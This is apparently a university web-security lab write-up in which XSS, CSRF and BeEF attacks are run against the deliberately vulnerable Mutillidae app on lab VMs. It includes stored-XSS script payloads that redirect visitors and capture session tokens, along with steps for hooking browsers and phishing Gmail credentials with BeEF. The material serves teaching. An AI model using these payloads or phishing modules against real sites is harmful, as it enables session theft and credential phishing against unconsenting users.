# INFO-6076 – Web Security
## Lab 03: XSS, CSRF, and BeEF

### Lab Requirements
- Internet connectivity & VMware Workstation version 15.5.7 or above.
- Mutillidae installed and running on the Ubuntu VM.

---

### Part 01: Stored XSS Page Redirection
**Task**: Exploit stored XSS to redirect users to an external site.
**Steps**:
1. On Kali VM, navigate to Mutillidae and reset the database.
2. Go to OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent -> Add to your blog.
3. Enter `<script>window.location = "http://www.offensive-security.com/"</script>` in the blog entry.
4. On Windows 10 VM, open Firefox, go to Mutillidae, and observe the redirection in action.
**Screenshot**:
<img src="https://i.imgur.com/QmlEb1i.png" height="400px" width="auto" alt="Stored XSS Page Redirection"/>

---

### Part 02: Grabbing Session Tokens with Stored XSS
**Task**: Capture session tokens using XSS.
**Steps**:
1. Still on Kali VM, after resetting the database, create a user 'FOLusername'.
2. Log in and insert `<script>document.location="http://folusernameuws/mutillidae/index.php?page=capture-data.php"</script>` to the blog.
3. On Windows 10 VM, log in as a different user and access the blog to trigger token capture.
**Screenshot**:
<img src="https://i.imgur.com/jSgEDnl.png" height="400px" width="auto" alt="Session Tokens Captured"/>

---

### Part 03: Cross Site Request Forgery (CSRF)
**Task**: Carry out a CSRF attack.
**Steps**:
1. Find the CSRF code in Mutillidae-Test-Scripts.txt using directory traversal.
2. Modify the code to add a fake news entry and insert it into the blog page.
3. On Windows 10 VM, log in as 'FOLusername' and hover over the malicious text to trigger the CSRF.
**Screenshot**:
<img src="https://i.imgur.com/uRBmyWe.png" height="400px" width="auto" alt="CSRF Attack Demonstration"/>

---

### Part 04: BeEF Setup
**Task**: Install and configure BeEF on Kali Linux.
**Steps**:
1. Clone the BeEF repo and navigate to the directory to install it.
2. Start BeEF using `./beef` and log into the control panel.
3. Prepare a hook.js script and embed it into a webpage.
**Screenshot**:
<img src="https://i.imgur.com/USebYOE.png" height="400px" width="auto" alt="BeEF Setup"/>

---

### Part 05: Hooking Browsers
**Task**: Hook a browser using BeEF.
**Steps**:
1. Create a user 'FOLusername' in Mutillidae on the Windows 10 VM.
2. Log in and navigate to the blog page where the hook.js is embedded.
3. From BeEF Control Panel, observe the hooked browser.
   Capture:
Take a screenshot showing the hooked browser in BeEF's control panel and the victim's browser directed to the hook page.
**Screenshot**:
<img src="https://i.imgur.com/ThZ1xwb.png" height="400px" width="auto" alt="Browser Hooked with BeEF"/>

---


### Part 06: Social Engineering with BeEF
**Task**: Execute a social engineering attack using BeEF.
**Steps**:
1. Navigate to the "Social Engineering" module in BeEF.
2. Configure and execute the "Fake Flash Update" module.
3. After the fake update prompt, locate and use the module for phishing Google Mail credentials.
4. Capture the credentials entered by the victim.
**Screenshot**:
<img src="https://i.imgur.com/NKnBmRX.png" height="400px" width="auto" alt="Social Engineering with BeEF"/>

---

### Conclusion
This lab provided hands-on experience in web security, with a focus on exploitation techniques and the use of frameworks like BeEF for educational purposes.

**Reminder**: Always conduct security practices ethically and within a controlled environment. Unauthorized testing or exploitation is illegal and unethical.
